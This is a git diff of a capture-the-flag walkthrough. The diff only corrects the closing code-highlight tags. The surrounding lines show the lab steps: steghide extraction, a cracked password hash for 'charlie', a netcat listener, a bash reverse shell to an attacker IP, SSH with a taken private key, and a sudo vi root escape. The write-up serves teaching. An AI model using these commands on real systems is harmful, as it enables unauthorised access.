@@ -132,7 +132,7 @@ Lets download this and inspect it
 
 {% highlight bash %}
 >> get gum_room.jpg
-{% highlight bash %}
+{% endhighlight bash %}
 
 ********************8
 
@@ -143,7 +143,7 @@ Lets run steghide extract any hidden data
 {% highlight bash %}
 $ steghide extract -sf gun_room.jpg
 (no password)
-{% highlight bash %}
+{% endhighlight bash %}
 
 ***********************9
 
@@ -170,7 +170,7 @@ It works and we get the password for Charlie !
 
 {% highlight bash %}
 charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:cn7824
-{% highlight bash %}
+{% endhighlight bash %}
 
 This gives our answer to question 2 
 
@@ -186,7 +186,7 @@ Lets try and access the web server instead
 {% highlight bash %}
 Charlie
 cn7824
-{% highlight bash %}
+{% endhighlight bash %}
 
 
 We are able to login successfully as Charlie
@@ -205,13 +205,13 @@ First on our attacker machine we will run the command:
 
 {% highlight bash %}
 $ nc -lvnp <port of choice>
-{% highlight bash %}
+{% endhighlight bash %}
 
 Then in the command prompt of the web page we will put our reverse shell:
 
 {% highlight bash %}
 /bin/bash -c 'bash -i >& /dev/tcp/10.2.3.233/4444 0>&1'
-{% highlight bash %}
+{% endhighlight bash %}
 
 ***********************13
 
@@ -242,13 +242,13 @@ First copy and paste the entire private key file text onto your machine
 Then run:
 {% highlight bash %}
 $ chmod +x <private_key_file>
-{% highlight bash %}
+{% endhighlight bash %}
 
 Lets now try authenticate into ssh as Charlie
 
 {% highlight bash %}
 ssh -i id_rsa_file charlie@xxxx
-{% highlight bash %}
+{% endhighlight bash %}
 
 We get access as Charlie !
 
@@ -259,7 +259,7 @@ Lets capture that user flag
 
 {% highlight bash %}
 cat /home/charlie/user.txt
-{% highlight bash %}
+{% endhighlight bash %}
 
 ***********************17
 
@@ -276,7 +276,7 @@ Looking for binary exploits we see a vi script:
 
 {% highlight bash %}
 $ sudo vi -c ':!/bin/sh' /dev/null
-{% highlight bash %}
+{% endhighlight bash %}
 
 Entering this command is successful
 We get root access
@@ -287,14 +287,14 @@ look like the root flag is contained within a python script:
 
 {% highlight bash %}
 ./root.py
-{% highlight bash %}
+{% endhighlight bash %}
 
 ***********************20
 
 Lets try an run it:
 {% highlight bash %}
 python3 ./root.py
-{% highlight bash %}
+{% endhighlight bash %}
 
 ***********************21
 
@@ -302,7 +302,7 @@ Looks like we need the key we found earlier
 
 {% highlight bash %}
 >b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
-{% highlight bash %}
+{% endhighlight bash %}
 
 ***********************22
  
